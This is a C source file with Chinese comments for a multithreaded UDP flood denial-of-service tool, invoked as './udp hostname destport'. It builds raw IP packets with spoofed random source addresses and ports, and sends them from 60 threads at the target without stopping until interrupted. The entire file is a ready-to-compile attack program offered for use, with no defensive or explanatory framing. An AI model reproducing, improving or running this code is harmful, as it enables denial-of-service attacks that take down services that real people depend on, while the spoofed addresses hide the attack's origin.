//udp攻击
//使用方法:./udp hostname  destport
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <string.h>
#include <syslog.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <errno.h>
//最多线程数
#define MAXCHILD 60
//目的IP地址
struct sockaddr_in dest;
static int PROTO_UDP=-1;
static int alive=-1;
int rawsock;
//信号处理函数,设置退出变量alive
void DoS_sig(int signo)
{
    alive = 0;
}
//计算校验和
unsigned short checksum(unsigned char *buf,int len)
{
    unsigned int sum=0;
    unsigned short *cbuf;
    
    cbuf=(unsigned short *)buf;
    
    while(len>1)
    {
        sum+=*cbuf++;
        len-=2;  //剩余尚未累加的16比特的个数
    }
    
    if(len) //若len的长度不是偶数
        sum+=*(unsigned char *)cbuf; //用最后一个字节补齐
    
    //防溢出处理
    sum=(sum>>16)+(sum & 0xffff);
    sum+=(sum>>16);
    return ~sum;
}
void DoS_Udp (int port)
{
    struct sockaddr_in to;
    struct ip *iph;
    struct udphdr *udp;
    char *packet;
    int pktsize = sizeof (struct ip) + sizeof (struct udphdr) + 64;
    packet =(char *)malloc (pktsize);
    iph = (struct ip *) packet; //定位IP报头部
    udp = (struct udphdr *) (packet + sizeof (struct ip)); //定位上层协议位置（udp报文头部）
    memset (packet, 0, pktsize);
    
    //IP的版本,IPv4
    iph->ip_v = 4;
    //IP头部长度,字节数
    iph->ip_hl = 5;
    //服务类型
    iph->ip_tos = 0;
    //IP报文的总长度
    iph->ip_len = htons (pktsize);
    //标识,设置为PID
    iph->ip_id = htons (getpid ());
    //段的偏移地址
    iph->ip_off = 0;
    //TTL
    iph->ip_ttl = 255;
    //协议类型
    iph->ip_p = PROTO_UDP;
    //校验和,先填写为0
    iph->ip_sum = 0;
    
    //发送的源地址，随机创建
    iph->ip_src.s_addr =random();
    
    //发送目标地址
    iph->ip_dst = dest.sin_addr;
    
    
    
    udp->source=random();
    udp->dest=htons(port);
    
    udp->len=sizeof(struct udphdr)+64;
    udp->check=0;
    udp->check=checksum((unsigned char*)udp, sizeof( struct udphdr)+64);
    //填写发送目的地址部分
    to.sin_family =  AF_INET;
    to.sin_addr = dest.sin_addr;
    to.sin_port = htons(0);
    //发送数据
    sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));
    //放内存
    free (packet);
}
void *DoS_fun (void *port)
{
    while(alive)
    {
        DoS_Udp(*(int*)port);
       // break;
        
    }
    return NULL;
}
int main(int argc,char **argv)
{
    int port;
    struct hostent *host;
    struct protoent *protocol;
    char protoname[]="udp";
    pthread_t pthread[MAXCHILD]; //线程标志数组
    socklen_t on=1;
    alive = 1;
    //截取信号CTRL+C
    signal(SIGINT, DoS_sig);//设置信号处理函数
    // 参数是否数量正确
    if(argc < 3)
    {
        printf("usage : \n");
        return -1;
    }
    port=atoi(argv[2]);
    protocol=getprotobyname(protoname);
    PROTO_UDP=protocol->p_proto;
    dest.sin_addr.s_addr = inet_addr(argv[1]);
    if(dest.sin_addr.s_addr == INADDR_NONE)
    {
        //为DNS地址
        host = gethostbyname(argv[1]);
        if(host == NULL)
        {
            perror("gethostbyname");
            return -1;
            
        }
        char str[30];
        //  printf("host:%s\n",inet_ntop(host->h_addrtype,host->h_addr,str,30));
        struct in_addr in;
        memcpy(&in.s_addr,host->h_addr_list[0],sizeof(in.s_addr));
        //printf("ip:%s\n",inet_ntoa(in));
        dest.sin_addr=in;
        
        
    }
    printf("ip:%s\n",inet_ntoa(dest.sin_addr));
    // 建立原始socket
    rawsock = socket (AF_INET, SOCK_RAW, PROTO_UDP);
    if (rawsock < 0)
    {
        perror("socket error");
        exit(1);
    }
    // 设置IP选项，自己构建IP报头部
    setsockopt (rawsock,IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    //建立多个线程协同工作
    int i=0;
    for(i=0; i<MAXCHILD; i++)
    {
        pthread_create(&pthread[i], NULL, DoS_fun, (void *)&port);
    }
    //等待线程结束
    for( i=0; i<MAXCHILD; i++)
        pthread_join(pthread[i], NULL);
    
    printf("over \n");
    close(rawsock);
    
    return 0;
}
